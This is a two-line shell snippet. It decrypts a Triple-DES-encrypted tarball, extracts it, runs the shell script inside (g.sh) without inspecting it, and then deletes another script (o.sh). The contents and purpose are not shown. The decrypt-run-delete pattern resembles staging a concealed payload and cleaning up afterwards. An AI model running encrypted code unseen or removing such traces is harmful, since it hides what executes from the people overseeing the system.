openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
rm o.sh
